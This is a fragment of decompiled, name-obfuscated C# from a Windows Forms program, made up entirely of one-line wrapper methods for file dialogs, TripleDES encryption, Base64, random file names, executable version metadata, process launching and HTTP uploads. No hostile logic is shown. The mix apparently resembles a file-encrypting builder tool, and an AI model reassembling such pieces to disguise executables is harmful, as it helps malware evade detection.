	static string smethod_30(string string_0, object object_0, object object_1)
	{
		return string.Format(string_0, object_0, object_1);
	}

	// Token: 0x060003F6 RID: 1014 RVA: 0x0000213A File Offset: 0x0000033A
	static void smethod_31(string string_0, string string_1)
	{
		File.WriteAllText(string_0, string_1);
	}

	// Token: 0x060003F7 RID: 1015 RVA: 0x00002FD7 File Offset: 0x000011D7
	static bool smethod_32(IEnumerator ienumerator_0)
	{
		return ienumerator_0.MoveNext();
	}

	// Token: 0x060003F8 RID: 1016 RVA: 0x00002FDF File Offset: 0x000011DF
	static void smethod_33(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	// Token: 0x060003F9 RID: 1017 RVA: 0x0000388E File Offset: 0x00001A8E
	static OpenFileDialog smethod_34()
	{
		return new OpenFileDialog();
	}

	// Token: 0x060003FA RID: 1018 RVA: 0x00003895 File Offset: 0x00001A95
	static void smethod_35(FileDialog fileDialog_0, string string_0)
	{
		fileDialog_0.Title = string_0;
	}

	// Token: 0x060003FB RID: 1019 RVA: 0x0000389E File Offset: 0x00001A9E
	static void smethod_36(FileDialog fileDialog_0, string string_0)
	{
		fileDialog_0.Filter = string_0;
	}

	// Token: 0x060003FC RID: 1020 RVA: 0x000038A7 File Offset: 0x00001AA7
	static DialogResult smethod_37(CommonDialog commonDialog_0)
	{
		return commonDialog_0.ShowDialog();
	}

	// Token: 0x060003FD RID: 1021 RVA: 0x000038AF File Offset: 0x00001AAF
	static string smethod_38(FileDialog fileDialog_0)
	{
		return fileDialog_0.FileName;
	}

	// Token: 0x060003FE RID: 1022 RVA: 0x000038B7 File Offset: 0x00001AB7
	static void smethod_39(PictureBox pictureBox_0, string string_0)
	{
		pictureBox_0.ImageLocation = string_0;
	}

	// Token: 0x060003FF RID: 1023 RVA: 0x000038C0 File Offset: 0x00001AC0
	static Random smethod_40()
	{
		return new Random();
	}

	// Token: 0x06000400 RID: 1024 RVA: 0x000038C7 File Offset: 0x00001AC7
	static int smethod_41(string string_0)
	{
		return string_0.Length;
	}

	// Token: 0x06000401 RID: 1025 RVA: 0x000020F5 File Offset: 0x000002F5
	static char smethod_42(string string_0, int int_0)
	{
		return string_0[int_0];
	}

	// Token: 0x06000402 RID: 1026 RVA: 0x000038CF File Offset: 0x00001ACF
	static Encoding smethod_43()
	{
		return Encoding.UTF8;
	}

	// Token: 0x06000403 RID: 1027 RVA: 0x000038D6 File Offset: 0x00001AD6
	static byte[] smethod_44(Encoding encoding_0, string string_0)
	{
		return encoding_0.GetBytes(string_0);
	}

	// Token: 0x06000404 RID: 1028 RVA: 0x000038DF File Offset: 0x00001ADF
	static MD5CryptoServiceProvider smethod_45()
	{
		return new MD5CryptoServiceProvider();
	}

	// Token: 0x06000405 RID: 1029 RVA: 0x000038E6 File Offset: 0x00001AE6
	static byte[] smethod_46(HashAlgorithm hashAlgorithm_0, byte[] byte_0)
	{
		return hashAlgorithm_0.ComputeHash(byte_0);
	}

	// Token: 0x06000406 RID: 1030 RVA: 0x000038EF File Offset: 0x00001AEF
	static TripleDESCryptoServiceProvider smethod_47()
	{
		return new TripleDESCryptoServiceProvider();
	}

	// Token: 0x06000407 RID: 1031 RVA: 0x000038F6 File Offset: 0x00001AF6
	static void smethod_48(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0)
	{
		symmetricAlgorithm_0.Key = byte_0;
	}

	// Token: 0x06000408 RID: 1032 RVA: 0x000038FF File Offset: 0x00001AFF
	static void smethod_49(SymmetricAlgorithm symmetricAlgorithm_0, CipherMode cipherMode_0)
	{
		symmetricAlgorithm_0.Mode = cipherMode_0;
	}

	// Token: 0x06000409 RID: 1033 RVA: 0x00003908 File Offset: 0x00001B08
	static void smethod_50(SymmetricAlgorithm symmetricAlgorithm_0, PaddingMode paddingMode_0)
	{
		symmetricAlgorithm_0.Padding = paddingMode_0;
	}

	// Token: 0x0600040A RID: 1034 RVA: 0x00003911 File Offset: 0x00001B11
	static ICryptoTransform smethod_51(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		return symmetricAlgorithm_0.CreateEncryptor();
	}

	// Token: 0x0600040B RID: 1035 RVA: 0x00003919 File Offset: 0x00001B19
	static byte[] smethod_52(ICryptoTransform icryptoTransform_0, byte[] byte_0, int int_0, int int_1)
	{
		return icryptoTransform_0.TransformFinalBlock(byte_0, int_0, int_1);
	}

	// Token: 0x0600040C RID: 1036 RVA: 0x00003924 File Offset: 0x00001B24
	static string smethod_53(byte[] byte_0, int int_0, int int_1)
	{
		return Convert.ToBase64String(byte_0, int_0, int_1);
	}

	// Token: 0x0600040D RID: 1037 RVA: 0x0000392E File Offset: 0x00001B2E
	static string smethod_54()
	{
		return Path.GetRandomFileName();
	}

	// Token: 0x0600040E RID: 1038 RVA: 0x00002130 File Offset: 0x00000330
	static string smethod_55(string string_0, string string_1, string string_2)
	{
		return string_0.Replace(string_1, string_2);
	}

	// Token: 0x0600040F RID: 1039 RVA: 0x00002476 File Offset: 0x00000676
	static string smethod_56(Control control_0)
	{
		return control_0.Text;
	}

	// Token: 0x06000410 RID: 1040 RVA: 0x00003935 File Offset: 0x00001B35
	static bool smethod_57(string string_0, string string_1)
	{
		return string_0 == string_1;
	}

	// Token: 0x06000411 RID: 1041 RVA: 0x0000393E File Offset: 0x00001B3E
	static SaveFileDialog smethod_58()
	{
		return new SaveFileDialog();
	}

	// Token: 0x06000412 RID: 1042 RVA: 0x00003945 File Offset: 0x00001B45
	static void smethod_59(FileDialog fileDialog_0, string string_0)
	{
		fileDialog_0.FileName = string_0;
	}

	// Token: 0x06000413 RID: 1043 RVA: 0x0000394E File Offset: 0x00001B4E
	static DialogResult smethod_60(CommonDialog commonDialog_0, IWin32Window iwin32Window_0)
	{
		return commonDialog_0.ShowDialog(iwin32Window_0);
	}

	// Token: 0x06000414 RID: 1044 RVA: 0x00003957 File Offset: 0x00001B57
	static string smethod_61(string string_0)
	{
		return Path.GetFileNameWithoutExtension(string_0);
	}

	// Token: 0x06000415 RID: 1045 RVA: 0x0000395F File Offset: 0x00001B5F
	static bool smethod_62(string string_0, string string_1)
	{
		return string_0 != string_1;
	}

	// Token: 0x06000416 RID: 1046 RVA: 0x00003968 File Offset: 0x00001B68
	static FileStream smethod_63(string string_0, FileMode fileMode_0, FileAccess fileAccess_0)
	{
		return new FileStream(string_0, fileMode_0, fileAccess_0);
	}

	// Token: 0x06000417 RID: 1047 RVA: 0x00003972 File Offset: 0x00001B72
	static void smethod_64(Random random_1, byte[] byte_0)
	{
		random_1.NextBytes(byte_0);
	}

	// Token: 0x06000418 RID: 1048 RVA: 0x0000397B File Offset: 0x00001B7B
	static void smethod_65(Stream stream_0, byte[] byte_0, int int_0, int int_1)
	{
		stream_0.Write(byte_0, int_0, int_1);
	}

	// Token: 0x06000419 RID: 1049 RVA: 0x00003986 File Offset: 0x00001B86
	static void smethod_66(Stream stream_0)
	{
		stream_0.Close();
	}

	// Token: 0x0600041A RID: 1050 RVA: 0x0000398E File Offset: 0x00001B8E
	static FileVersionInfo smethod_67(string string_0)
	{
		return FileVersionInfo.GetVersionInfo(string_0);
	}

	// Token: 0x0600041B RID: 1051 RVA: 0x00003996 File Offset: 0x00001B96
	static string smethod_68(FileVersionInfo fileVersionInfo_0)
	{
		return fileVersionInfo_0.CompanyName;
	}

	// Token: 0x0600041C RID: 1052 RVA: 0x0000399E File Offset: 0x00001B9E
	static string smethod_69(FileVersionInfo fileVersionInfo_0)
	{
		return fileVersionInfo_0.FileDescription;
	}

	// Token: 0x0600041D RID: 1053 RVA: 0x000039A6 File Offset: 0x00001BA6
	static string smethod_70(FileVersionInfo fileVersionInfo_0)
	{
		return fileVersionInfo_0.LegalCopyright;
	}

	// Token: 0x0600041E RID: 1054 RVA: 0x000039AE File Offset: 0x00001BAE
	static int smethod_71(FileVersionInfo fileVersionInfo_0)
	{
		return fileVersionInfo_0.FileMajorPart;
	}

	// Token: 0x0600041F RID: 1055 RVA: 0x000039B6 File Offset: 0x00001BB6
	static Process smethod_72(string string_0)
	{
		return Process.Start(string_0);
	}

	// Token: 0x06000420 RID: 1056 RVA: 0x000039BE File Offset: 0x00001BBE
	static string smethod_73(object object_0, object object_1)
	{
		return object_0 + object_1;
	}

	// Token: 0x06000421 RID: 1057 RVA: 0x000039C7 File Offset: 0x00001BC7
	static string smethod_74(string string_0, string string_1, string string_2)
	{
		return string_0 + string_1 + string_2;
	}

	// Token: 0x06000422 RID: 1058 RVA: 0x000039D1 File Offset: 0x00001BD1
	static WebClient smethod_75()
	{
		return new WebClient();
	}

	// Token: 0x06000423 RID: 1059 RVA: 0x000039D8 File Offset: 0x00001BD8
	static WebProxy smethod_76(string string_0)
	{
		return new WebProxy(string_0);
	}

	// Token: 0x06000424 RID: 1060 RVA: 0x000039E0 File Offset: 0x00001BE0
	static void smethod_77(WebClient webClient_0, IWebProxy iwebProxy_0)
	{
		webClient_0.Proxy = iwebProxy_0;
	}

	// Token: 0x06000425 RID: 1061 RVA: 0x000039E9 File Offset: 0x00001BE9
	static NetworkCredential smethod_78(string string_0, string string_1)
	{
		return new NetworkCredential(string_0, string_1);
	}

	// Token: 0x06000426 RID: 1062 RVA: 0x000039F2 File Offset: 0x00001BF2
	static void smethod_79(WebClient webClient_0, ICredentials icredentials_0)
	{
		webClient_0.Credentials = icredentials_0;
	}

	// Token: 0x06000427 RID: 1063 RVA: 0x000039FB File Offset: 0x00001BFB
	static NameValueCollection smethod_80()
	{
		return new NameValueCollection();
	}

	// Token: 0x06000428 RID: 1064 RVA: 0x00003A02 File Offset: 0x00001C02
	static void smethod_81(NameValueCollection nameValueCollection_0, string string_0, string string_1)
	{
		nameValueCollection_0.Add(string_0, string_1);
	}

	// Token: 0x06000429 RID: 1065 RVA: 0x00003A0C File Offset: 0x00001C0C
	static byte[] smethod_82(WebClient webClient_0, string string_0, NameValueCollection nameValueCollection_0)
	{
		return webClient_0.UploadValues(string_0, nameValueCollection_0);
	}

	// Token: 0x0600042A RID: 1066 RVA: 0x00003A16 File Offset: 0x00001C16
	static string smethod_83(Encoding encoding_0, byte[] byte_0)
	{
		return encoding_0.GetString(byte_0);
	}

	// Token: 0x0600042B RID: 1067 RVA: 0x00003A1F File Offset: 0x00001C1F
	static double smethod_84(Form form_0)
	{
		return form_0.Opacity;
	}

	// Token: 0x0600042C RID: 1068 RVA: 0x00003A27 File Offset: 0x00001C27
	static void smethod_85(Form form_0, double double_0)
	{
		form_0.Opacity = double_0;
	}

	// Token: 0x0600042D RID: 1069 RVA: 0x000020BF File Offset: 0x000002BF
	static void smethod_86(int int_0)
	{
		Thread.Sleep(int_0);
	}

	// Token: 0x0600042E RID: 1070 RVA: 0x00003A30 File Offset: 0x00001C30
	static void smethod_87(Control control_0)
	{
		control_0.Refresh();
	}

	// Token: 0x0600042F RID: 1071 RVA: 0x00003A38 File Offset: 0x00001C38
	static Container smethod_88()
	{
		return new Container();
	}

	// Token: 0x06000430 RID: 1072 RVA: 0x00002068 File Offset: 0x00000268
	static Type smethod_89(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	// Token: 0x06000431 RID: 1073 RVA: 0x00003A3F File Offset: 0x00001C3F
	static ComponentResourceManager smethod_90(Type type_0)
	{
		return new ComponentResourceManager(type_0);
	}

	// Token: 0x06000432 RID: 1074 RVA: 0x00003A47 File Offset: 0x00001C47
	static ToolTip smethod_91(IContainer icontainer_1)
	{
		return new ToolTip(icontainer_1);
	}

	// Token: 0x06000433 RID: 1075 RVA: 0x00003A4F File Offset: 0x00001C4F
	static TabPage smethod_92()
	{
		return new TabPage();
	}

	// Token: 0x06000434 RID: 1076 RVA: 0x00003A56 File Offset: 0x00001C56
	static PictureBox smethod_93()
	{
		return new PictureBox();
	}

	// Token: 0x06000435 RID: 1077 RVA: 0x00002B8B File Offset: 0x00000D8B
	static ListBox smethod_94()
	{
		return new ListBox();
	}

	// Token: 0x06000436 RID: 1078 RVA: 0x00003A5D File Offset: 0x00001C5D
	static void smethod_95(Control control_0)
	{
		control_0.SuspendLayout();
	}

	// Token: 0x06000437 RID: 1079 RVA: 0x00003A65 File Offset: 0x00001C65
	static void smethod_96(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	// Token: 0x06000438 RID: 1080 RVA: 0x00003A6D File Offset: 0x00001C6D
	static void smethod_97(Control control_0)
	{
		control_0.SuspendLayout();
	}

	// Token: 0x06000439 RID: 1081 RVA: 0x00002372 File Offset: 0x00000572
	static void smethod_98(Control control_0, Color color_0)
	{
		control_0.BackColor = color_0;
	}

	// Token: 0x0600043A RID: 1082 RVA: 0x000025C1 File Offset: 0x000007C1
	static Cursor smethod_99()
	{
		return Cursors.Hand;
	}

	// Token: 0x0600043B RID: 1083 RVA: 0x000025C8 File Offset: 0x000007C8
	static void smethod_100(Control control_0, Cursor cursor_0)
	{
		control_0.Cursor = cursor_0;
	}

	// Token: 0x0600043C RID: 1084 RVA: 0x000025D1 File Offset: 0x000007D1
	static Font smethod_101(string string_0, float float_0)
	{
		return new Font(string_0, float_0);
	}

	// Token: 0x0600043D RID: 1085 RVA: 0x000025DA File Offset: 0x000007DA
	static void smethod_102(Control control_0, Font font_0)
	{
		control_0.Font = font_0;
	}

	// Token: 0x040000CD RID: 205
	private static Random random_0 = Form1.smethod_40();

	// Token: 0x040000CE RID: 206
	private bool bool_0;
}
